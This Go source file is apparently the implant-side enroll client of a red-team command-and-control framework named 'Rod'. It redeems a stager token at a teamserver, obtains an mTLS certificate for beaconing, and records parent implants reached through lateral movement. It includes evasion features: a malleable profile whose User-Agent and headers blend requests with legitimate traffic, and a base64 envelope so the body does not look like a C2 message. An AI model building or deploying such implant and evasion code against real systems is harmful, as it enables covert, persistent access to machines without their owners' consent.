// Package c2 holds the reference implant's teamserver-facing clients: the enroll
// client (this file) and the mTLS beacon client (package beacon). They speak the
// Rod wire protocol and the JSON enroll contract; nothing here is implant-only
// tradecraft -- the same shapes are what any Rod implant of any language sends.
package c2

import (
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

// EnrollStatus mirrors the wire rod.v1.EnrollStatus (architecture.md Sec 9). Kept
// as an int here rather than imported from the generated bindings, because enroll
// is plain JSON over HTTP (not the protobuf stream) and the enum is the only
// contract shared with the JSON body.
type EnrollStatus int

const (
	EnrollStatusUnspecified EnrollStatus = iota
	EnrollStatusOK
	EnrollStatusBadToken
	EnrollStatusExpired
	EnrollStatusSpent
)

// enrollRequest is the JSON body of POST /implants/enroll. PublicKey is the
// implant's own SubjectPublicKeyInfo, base64 over JSON; the teamserver signs a
// leaf over it so the implant keeps its private key (architecture.md Sec 9).
// ParentImplantID, when set, names the implant this one derives from
// (architecture.md Sec 10.1): a child enroll carried over from lateral.move.
type enrollRequest struct {
	StagerTokenSecret string  `json:"stagerTokenSecret"`
	Class             *string `json:"class,omitempty"`
	PublicKey         string  `json:"publicKey,omitempty"`
	ParentImplantID   string  `json:"parentImplantId,omitempty"`
}

// enrollResponse mirrors the teamserver's EnrollmentResponse: the issued leaf and
// CA chain, base64 over JSON, with the wire status. On a non-OK status the cert
// fields are empty.
type enrollResponse struct {
	Status          EnrollStatus `json:"status"`
	ImplantID       string       `json:"implantId,omitempty"`
	EngagementID    string       `json:"engagementId,omitempty"`
	LeafCertificate string       `json:"leafCertificate,omitempty"`
	CaChain         []string     `json:"caChain,omitempty"`
	ParentImplantID string       `json:"parentImplantId,omitempty"`
}

// Enrollment is the result of a successful enroll: the implant's identity, its
// engagement, the leaf certificate paired with its private key (so it can be
// presented in mTLS), and the CA chain to trust as the server identity.
// ParentImplantID is set only for a child enroll that named a parent.
type Enrollment struct {
	ImplantID    string
	EngagementID string
	// Leaf is the issued certificate paired with the implant's private key, ready
	// to present as a TLS client certificate.
	Leaf tls.Certificate
	// CAs are the teamserver CA(s), trusted as the mTLS server identity and used
	// to validate the leaf's chain at enroll.
	CAs []*x509.Certificate
	// ParentImplantID is the parent this implant derived from, empty for a
	// top-level (stager-derived) enroll.
	ParentImplantID string
}

// TransportProfile is the malleable wire-shape profile the enroll client applies
// to the enroll request (architecture.md Sec 7, M4.3). Each field is optional and
// zero-valued to a no-op: the client enrolls against the given enrollURL as-is,
// with no custom headers and a raw-JSON body. The caller (main) builds it from
// the operator/baked profile so c2 stays free of config coupling.
type TransportProfile struct {
	// UserAgent is the User-Agent header presented on enroll. Empty omits it.
	UserAgent string
	// Headers are extra HTTP headers applied to the enroll request.
	Headers map[string]string
	// RequestTimeout is the per-request timeout. Zero means the default (30s).
	RequestTimeout time.Duration
	// Envelope is how the enroll JSON body is shaped: EnvelopeNone sends raw
	// JSON, EnvelopeBase64 wraps it as a single base64 string.
	Envelope Envelope
}

// Envelope selects how the enroll JSON body is shaped on the wire.
type Envelope int

const (
	// EnvelopeNone sends the enroll body as the raw JSON document.
	EnvelopeNone Envelope = iota
	// EnvelopeBase64 wraps the enroll JSON body as a single base64 string so the
	// request body no longer looks like a structured C2 message.
	EnvelopeBase64
)

// DefaultRequestTimeout is the enroll timeout used when a profile does not pin
// its own (the value the reference implant used before the profile carried one).
const DefaultRequestTimeout = 30 * time.Second

// Enroll redeems the stager token at the teamserver, sending the implant's own
// public key, and returns the bound leaf paired with the private key. The
// implant owns its private key throughout; only the public half crosses the wire
// (architecture.md Sec 9). serverCAs pins which server identity to accept over
// the enroll TLS connection (empty trusts the system roots).
//
// parentImplantID names the implant this one derives from on a child enroll
// (architecture.md Sec 10.1, lateral.move); empty is a top-level enroll. The
// teamserver resolves and scope-checks the parent before recording the linkage.
//
// profile shapes the enroll request per the malleable transport profile
// (architecture.md Sec 7, M4.3): its User-Agent and Headers are set on the
// request, RequestTimeout bounds the call, and Envelope wraps the JSON body when
// set to EnvelopeBase64. A zero-value profile leaves the request identical to
// the un-profiled shape.
func Enroll(enrollURL, stagerToken, parentImplantID string, privateKey *rsa.PrivateKey, serverCAs *x509.CertPool, profile TransportProfile) (*Enrollment, error) {
	pubDER, err := x509.MarshalPKIXPublicKey(&privateKey.PublicKey)
	if err != nil {
		return nil, fmt.Errorf("marshal public key: %w", err)
	}
	body := enrollRequest{
		StagerTokenSecret: stagerToken,
		PublicKey:         base64.StdEncoding.EncodeToString(pubDER),
		ParentImplantID:   parentImplantID,
	}
	raw, err := json.Marshal(body)
	if err != nil {
		return nil, err
	}

	// Apply the body envelope: base64 wraps the JSON as a single string so the
	// request body differs from a raw-JSON enroll (architecture.md Sec 7).
	payload := raw
	if profile.Envelope == EnvelopeBase64 {
		payload = []byte(base64.StdEncoding.EncodeToString(raw))
	}

	timeout := profile.RequestTimeout
	if timeout <= 0 {
		timeout = DefaultRequestTimeout
	}
	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{RootCAs: serverCAs, MinVersion: tls.VersionTLS12},
		},
	}

	req, err := http.NewRequest(http.MethodPost, enrollURL, bytes.NewReader(payload))
	if err != nil {
		return nil, fmt.Errorf("build enroll request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	// The malleable profile (architecture.md Sec 7, M4.3): a User-Agent blends
	// the request with legitimate traffic, and custom headers match a known-good
	// client shape. Set after Content-Type so a profile cannot accidentally drop
	// it; a profile Header named Content-Type still wins explicitly below.
	if profile.UserAgent != "" {
		req.Header.Set("User-Agent", profile.UserAgent)
	}
	for name, value := range profile.Headers {
		req.Header.Set(name, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("enroll request: %w", err)
	}
	defer resp.Body.Close()

	var er enrollResponse
	if err := json.NewDecoder(resp.Body).Decode(&er); err != nil {
		return nil, fmt.Errorf("enroll response: %w", err)
	}
	if er.Status != EnrollStatusOK {
		return nil, fmt.Errorf("enroll rejected: status %d", er.Status)
	}

	leafDER, err := base64.StdEncoding.DecodeString(er.LeafCertificate)
	if err != nil {
		return nil, fmt.Errorf("decode leaf: %w", err)
	}
	leaf, err := x509.ParseCertificate(leafDER)
	if err != nil {
		return nil, fmt.Errorf("parse leaf: %w", err)
	}
	cas := make([]*x509.Certificate, 0, len(er.CaChain))
	for i, b64 := range er.CaChain {
		der, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			return nil, fmt.Errorf("decode ca[%d]: %w", i, err)
		}
		ca, err := x509.ParseCertificate(der)
		if err != nil {
			return nil, fmt.Errorf("parse ca[%d]: %w", i, err)
		}
		cas = append(cas, ca)
	}

	return &Enrollment{
		ImplantID:    er.ImplantID,
		EngagementID: er.EngagementID,
		Leaf: tls.Certificate{
			Certificate: [][]byte{leafDER},
			PrivateKey:  privateKey,
			Leaf:        leaf,
		},
		CAs:             cas,
		ParentImplantID: er.ParentImplantID,
	}, nil
}
